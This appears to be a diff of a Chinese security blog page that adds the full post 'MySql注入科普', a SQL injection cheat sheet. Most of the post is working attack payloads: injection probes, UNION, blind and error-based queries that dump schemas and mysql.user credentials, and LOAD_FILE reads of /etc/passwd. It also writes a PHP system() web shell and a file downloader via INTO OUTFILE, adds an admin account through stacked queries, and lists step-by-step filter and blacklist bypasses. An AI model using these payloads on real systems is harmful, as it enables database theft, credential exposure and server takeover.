@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:url" content="http://MaiKeFee.com/archives/2019/08/index.html">
+<meta name="description" content="默认存在的数据库：mysql    需要root权限读取information_schema    在5以上的版本中存在测试是否存在注入方法假：表示查询是错误的 (MySQL 报错/返回页面与原来不同) 真：表示查询是正常的 (返回页面与原来相同) 共三种情况： 字符串类型查询时：    数字类型查询时：    登陆时：‘    假‘’    真“    假“”    真\    假\    真A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySql注入科普">
+<meta property="og:url" content="http://MaiKeFee.com/archives/ad588fee.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta property="og:description" content="默认存在的数据库：mysql    需要root权限读取information_schema    在5以上的版本中存在测试是否存在注入方法假：表示查询是错误的 (MySQL 报错/返回页面与原来不同) 真：表示查询是正常的 (返回页面与原来相同) 共三种情况： 字符串类型查询时：    数字类型查询时：    登陆时：‘    假‘’    真“    假“”    真\    假\    真A">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-22T10:08:43.714Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta name="twitter:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta name="twitter:title" content="MySql注入科普">
+<meta name="twitter:description" content="默认存在的数据库：mysql    需要root权限读取information_schema    在5以上的版本中存在测试是否存在注入方法假：表示查询是错误的 (MySQL 报错/返回页面与原来不同) 真：表示查询是正常的 (返回页面与原来相同) 共三种情况： 字符串类型查询时：    数字类型查询时：    登陆时：‘    假‘’    真“    假“”    真\    假\    真A">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/2019/08/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/ad588fee.html">
 
 
 
 
 
-  <title>归档 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
+  <title>MySql注入科普 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -296,107 +297,262 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 2 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/ad588fee.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/archives/ad588fee.html" itemprop="url">
-              
-                <span itemprop="name">MySql注入科普</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">MySql注入科普</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-22T18:08:04+08:00" content="2019-08-22">
-          08-22
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-22T18:08:04+08:00">
+                2019-08-22
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-22T18:08:43+08:00">
+                2019-08-22
+              </time>
+            
+          </span>
 
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/archives/ad588fee.html" class="leancloud_visitors" data-flag-title="MySql注入科普">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/d87f7e0c.html" itemprop="url">
-              
-                <span itemprop="name">Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-21T10:12:01+08:00" content="2019-08-21">
-          08-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <p>默认存在的数据库：<br>mysql    需要root权限读取<br>information_schema    在5以上的版本中存在<br>测试是否存在注入方法<br>假：表示查询是错误的 (MySQL 报错/返回页面与原来不同)</p>
+<p>真：表示查询是正常的 (返回页面与原来相同)</p>
+<p>共三种情况：</p>
+<p>字符串类型查询时：    数字类型查询时：    登陆时：<br>‘    假<br>‘’    真<br>“    假<br>“”    真<br>\    假<br>\    真<br>AND 1    真<br>AND 0    假<br>AND true    真<br>AND false    假<br>1-false    有问题时返回1的结果<br>1-true    有问题时返回0的结果<br>2-1    返回与1相同代表可能存在问题<br>1<em>56    返回与56相同代表可能存在问题<br>1</em>56    返回与1相同代表没有问题<br>‘ OR ‘1<br>‘ OR 1 – -<br>“ OR “” = “<br>“ OR 1 = 1 – -<br>‘=’<br>‘LIKE’<br>‘=0–+<br>例子:</p>
+<p>SELECT * FROM Users WHERE id = ‘1’’’;<br>SELECT * FROM Users WHERE id = 3-2;<br>SELECT * FROM Users WHERE username = ‘Mike’ AND password = ‘’ OR ‘’ = ‘’;<br>可以使用很多单双引号，只要是成对出现。</p>
+<p>SELECT * FROM Articles WHERE id = ‘121’’’’’’’’’’’’’<br>引号后的语句会继续执行。</p>
+<p>SELECT ‘1’’’’’”” UNION SELECT ‘2’ # 1 and 2<br>下面的符号可以用来注释语句：</p>
+<h1 id="Hash-语法"><a href="#Hash-语法" class="headerlink" title="Hash 语法"></a>Hash 语法</h1><p>/*    C-style 语法<br>– -    SQL 语法<br>;%00    空字节<br>`    反引号<br>例子：</p>
+<p>SELECT * FROM Users WHERE username = ‘’ OR 1=1 – -‘ AND password = ‘’;<br>SELECT * FROM Users WHERE id = ‘’ UNION SELECT 1, 2, 3`’;<br>测试数据库版本<br>VERSION()<br>@@VERSION<br>@@GLOBAL.VERSION<br>如果版本为5的话，下面例子返回为真：</p>
+<p>SELECT * FROM Users WHERE id = ‘1’ AND MID(VERSION(),1,1) = ‘5’;<br>windows平台上的mysql查询与linux上返回不同，如果是windows服务器返回结果会包含 -nt-log字符。</p>
+<p>数据库认证信息：<br>表    mysql.user<br>字段    user, password<br>当前用户    user(), current_user(), current_user, system_user(), session_user()<br>例子：</p>
+<p>SELECT current_user;<br>SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = ‘root’– (Privileged)<br>数据库名：<br>表    information_schema.schemata, mysql.db<br>字段    schema_name, db<br>当前数据库    database(), schema()<br>例子：</p>
+<p>SELECT database();<br>SELECT schema_name FROM information_schema.schemata;<br>SELECT DISTINCT(db) FROM mysql.db;– (Privileged)<br>服务器主机名：<br>@@HOSTNAME<br>例子：</p>
+<p>SELECT @@hostname;<br>表和字段<br>检测字段数<br>两种方式：</p>
+<p>ORDER BY判断    ORDER BY n+1; 让n一直增加直到出现错误页面。 例子: 查询语句 SELECT username, password, permission FROM Users WHERE id = ‘1’; 1’ ORDER BY 1–+ 真 1’ ORDER BY 2–+ 真 1’ ORDER BY 3–+ 真 1’ ORDER BY 4–+ 假- 查询只用了3个字段 -1’ UNION SELECT 1,2,3–+ 真<br>基于错误查询    AND (SELECT * FROM SOME_EXISTING_TABLE) = 1 注意: 这种方式需要你知道所要查询的表名。 这种报错方式返回表的字段数，而不是错误的查询语句。 例子： 查询语句 SELECT permission FROM Users WHERE id = 1; AND (SELECT * FROM Users) = 1 返回Users的字段数<br>查询表名<br>三种方式：</p>
+<p>Union方式    UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;– MySQL 4版本时用version=9，MySQL 5版本时用version=10<br>盲注    AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; ‘A’<br>报错    AND(SELECT COUNT(<em>) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));– 在5.1.5版本中成功。<br>查询列名<br>Union方式    UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = ‘tablename’<br>盲注    AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; ‘A’<br>报错    AND(SELECT COUNT(</em>) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));– 在5.1.5版本中成功。 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)– MySQL 5.1版本修复了<br>利用PROCEDURE ANALYSE()    这个需要web展示页面有你所注入查询的一个字段。 例子: 查询语句 SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名<br>一次查询多个表或列<br>SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,’ [ ‘,table_schema,’ ] &gt;’,table_name,’ &gt; ‘,column_name))))x<br>例子：</p>
+<p>SELECT * FROM Users WHERE id = ‘-1’ UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,’ [ ‘,table_schema,’ ] &gt;’,table_name,’ &gt; ‘,column_name))))x), 4–+’;<br>输出结果：</p>
+<p> [ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME<br> [ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME<br> [ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION<br> [ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN<br> [ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME<br> [ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME<br> [ information_schema ] &gt;COLLATIONS &gt; ID<br> [ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT<br> [ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED<br>利用代码：</p>
+<p>SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns<br>例子：</p>
+<p>SELECT username FROM Users WHERE id = ‘-1’ UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns;<br>输出结果：</p>
+<p>Table: talk_revisions<br>Column: revid</p>
+<p>Table: talk_revisions<br>Column: userid</p>
+<p>Table: talk_revisions<br>Column: user</p>
+<p>Table: talk_projects<br>Column: priority<br>根据列名查询所在的表<br>SELECT table_name FROM information_schema.columns WHERE column_name = ‘username’;    查询字段为username的表<br>SELECT table_name FROM information_schema.columns WHERE column_name LIKE ‘%user%’;    查询字段中包含user的表<br>根据表查询包含的字段<br>SELECT column_name FROM information_schema.columns WHERE table_name = ‘Users’;    查询user表中的字段<br>SELECT column_name FROM information_schema.columns WHERE table_name LIKE ‘%user%’;    查询包含user字符串表中的字段<br>绕过引号限制<br>SELECT * FROM Users WHERE username = 0x61646D696E    Hex编码<br>SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)    利用CHAR()函数<br>绕过字符串黑名单<br>SELECT ‘a’ ‘d’ ‘mi’ ‘n’;<br>SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);<br>使用CONCAT()时，任何个参数为null，将返回null， 推荐使用CONCAT_WS() 。</p>
+<p>CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。</p>
+<p>条件语句<br>CASE<br>IF()<br>IFNULL()<br>NULLIF()<br>例子：</p>
+<p>SELECT IF(1=1, true, false);<br>SELECT CASE WHEN 1=1 THEN true ELSE false END;<br>时间延迟查询：<br>SLEEP()    MySQL 5<br>BENCHMARK()    MySQL 4/5<br>例子：</p>
+<p>‘ - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(‘true’)), false)) - ‘<br>权限<br>文件权限<br>下面的语句可以查询用户读写文件操作权限：</p>
+<p>SELECT file_priv FROM mysql.user WHERE user = ‘username’;    需要root用户来执行    MySQL 4/5<br>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’;    普通用户都可以    MySQL 5<br>读取文件<br>如果用户有文件操作权限可以读取文件：</p>
+<p>LOAD_FILE()<br>例子：</p>
+<p>SELECT LOAD_FILE(‘/etc/passwd’);<br>SELECT LOAD_FILE(0x2F6574632F706173737764);<br>文件必须在服务器上。<br>LOAD_FILE()函数操作文件的当前目录是@@datadir 。<br>MySQL用户必须拥有对此文件读取的权限。<br>文件大小必须小于 max_allowed_packet。<br>@@max_allowed_packet的默认大小是1047552 字节.<br>写文件<br>如果用户有文件操作权限可以写文件。</p>
+<p>INTO OUTFILE/DUMPFILE<br>写一个php的shell：</p>
+<p>SELECT ‘<? system($_GET[\'c\']); ?>‘ INTO OUTFILE ‘/var/www/shell.php’;<br>访问如下链接：</p>
+<p><a href="http://localhost/shell.php?c=cat%20/etc/passwd" target="_blank" rel="noopener">http://localhost/shell.php?c=cat%20/etc/passwd</a></p>
+<p>写一个下载者：</p>
+<p>SELECT ‘<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>‘ INTO OUTFILE ‘/var/www/get.php’<br>访问如下链接：</p>
+<p><a href="http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt" target="_blank" rel="noopener">http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt</a></p>
+<p>INTO OUTFILE 不可以覆盖已存在的文件。<br>INTO OUTFILE 必须是最后一个查询。<br>引号是必须的，因为没有办法可以编码路径名。<br>PDO堆查询方式操作数据库<br>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<p>SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username,password,priv) VALUES (‘BobbyTables’, ‘kl20da$$’,’admin’);<br>MySql特有的写法<br>MySql中，/*! SQL 语句 */ 这种格式里面的 SQL 语句会当正常的语句一样被解析。</p>
+<p>如果在!之后是一串数字(这串数字就是 mysql 数据库的版本号), 如：/*! 12345 SQL 语句 */</p>
+<p>当版本号大于等于该数字,SQL 语句则执行,否则就不执行。</p>
+<p>SELECT 1/<em>!41320UNION/</em>!/<em>!/</em>!00000SELECT/<em>!/</em>!USER/<em>!(/</em>!/<em>!/</em>!*/);<br>模糊和混淆<br>允许的字符<br>09    Horizontal Tab<br>0A    New Line<br>0B    Vertical Tab<br>0C    New Page<br>0D    Carriage Return<br>A0    Non-breaking Space<br>20    Space<br>例子：</p>
+<p>‘%0A%09UNION%0CSELECT%A0NULL%20%23<br>括号也可以用来绕过过滤空格的情况：</p>
+<p>28    (<br>29    )<br>例子：</p>
+<p>UNION(SELECT(column)FROM(table))<br>AND或OR后面可以跟的字符<br>20    Space<br>2B    +<br>2D    -<br>7E    ~<br>21    !<br>40    @<br>例子：</p>
+<p>SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))<br>dual是一个虚拟表，可以用来做测试。</p>
+<p>几个针对黑名单绕过的例子<br>基于关键字的黑名单<br>过滤关键字    and or<br>php代码    preg_match(‘/(and|or)/i’,$id)<br>会过滤的攻击代码    1 or 1=1 1 and 1=1<br>绕过方式    1 || 1=1 1 &amp;&amp; 1=1<br>下面这种方式你需要已经知道一些表和字段名（可以利用substring函数去一个一个获得information_schema.columns表中的数据）</p>
+<p>过滤关键字    and or union<br>php代码    preg_match(‘/(and|or|union)/i’,$id)<br>会过滤的攻击代码    union select user,password from users<br>绕过方式    1 &amp;&amp; (select user from users where userid=1)=’admin’<br>过滤关键字    and or union where<br>php代码    preg_match(‘/(and|or|union|where)/i’,$id)<br>会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’<br>绕过方式    1 &amp;&amp; (select user from users limit 1) = ‘admin’<br>过滤关键字    and or union where<br>php代码    preg_match(‘/(and|or|union|where)/i’,$id)<br>会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’<br>绕过方式    1 &amp;&amp; (select user from users limit 1) = ‘admin’<br>过滤关键字    and, or, union, where, limit<br>php代码    preg_match(‘/(and|or|union|where|limit)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; (select user from users limit 1) = ‘admin’<br>绕过方式    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’#user_id聚合中user_id为1的user为admin<br>过滤关键字    and, or, union, where, limit, group by<br>php代码    preg_match(‘/(and|or|union|where|limit|group by)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’<br>绕过方式    1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1<br>过滤关键字    and, or, union, where, limit, group by, select<br>php代码    preg_match(‘/(and|or|union|where|limit|group by|select)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1<br>绕过方式    1 &amp;&amp; substr(user,1,1) = ‘a’<br>过滤关键字    and, or, union, where, limit, group by, select, ‘<br>php代码    preg_match(‘/(and|or|union|where|limit|group by|select|&#39;)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1<br>绕过方式    1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)<br>过滤关键字    and, or, union, where, limit, group by, select, ‘, hex<br>php代码    preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = unhex(61)<br>绕过方式    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。<br>过滤关键字    and, or, union, where, limit, group by, select, ‘, hex, substr<br>php代码    preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex|substr)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;<br>绕过方式    1 &amp;&amp; lpad(user,7,1)<br>过滤关键字    and, or, union, where, limit, group by, select, ‘, hex, substr, 空格<br>php代码    preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex|substr|\s)/i’, $id)<br>会过滤的攻击代码    1 &amp;&amp; lpad(user,7,1)/td&gt;<br>绕过方式    1%0b||%0blpad(user,7,1)<br>过滤关键字    and or union where<br>php代码    preg_match(‘/(and|or|union|where)/i’,$id)<br>会过滤的攻击代码    1 || (select user from users where user_id = 1) = ‘admin’<br>绕过方式    1 || (select user from users limit 1) = ‘admin’<br>利用正则表达式进行盲注<br>我们都已经知道，在MYSQL 5+中 information_schema库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下：</p>
+<p>1、判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</p>
+<p>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-z]’ LIMIT 0,1) /*<br>2、判断第一个字符是否是a-n中的字符</p>
+<p>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-n]’ LIMIT 0,1)/*<br>3、确定该字符为n</p>
+<p>index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables  WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^n’ LIMIT 0,1) /*<br>4、表达式的更换如下</p>
+<p>‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE<br>这时说明表名为news ，要验证是否是该表明 正则表达式为’^news$’，但是没这必要 直接判断 table_name = ‘news’ 不就行了。</p>
+<p>5、接下来猜解其它表了 只需要修改 limit 1,1 -&gt; limit 2,1就可以对接下来的表进行盲注了。</p>
+<p>order by后的注入<br>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p>
+<p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
+<p>原始链接：<a href="http://www.test.com/list.php?order=vote" target="_blank" rel="noopener">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
+<p>找到投票数最大的票数num然后构造以下链接：</p>
+<p><a href="http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc" target="_blank" rel="noopener">http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</a><br>看排序是否变化。</p>
+<p>还有一种方法不需要知道任何字段信息，使用rand函数：</p>
+<p><a href="http://www.test.com/list.php?order=rand(true)" target="_blank" rel="noopener">http://www.test.com/list.php?order=rand(true)</a><br><a href="http://www.test.com/list.php?order=rand(false)" target="_blank" rel="noopener">http://www.test.com/list.php?order=rand(false)</a><br>以上两个会返回不同的排序，判断表名中第一个字符是否小于128的语句如下：</p>
+<p><a href="http://www.test.com/list.php?order=rand" target="_blank" rel="noopener">http://www.test.com/list.php?order=rand</a>((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))<br>宽字节注入<br>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
+
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/d87f7e0c.html" rel="next" title="Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)">
+                <i class="fa fa-chevron-left"></i> Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -404,6 +560,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -424,8 +587,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -485,6 +657,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hash-语法"><span class="nav-number">1.</span> <span class="nav-text">Hash 语法</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -641,6 +829,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
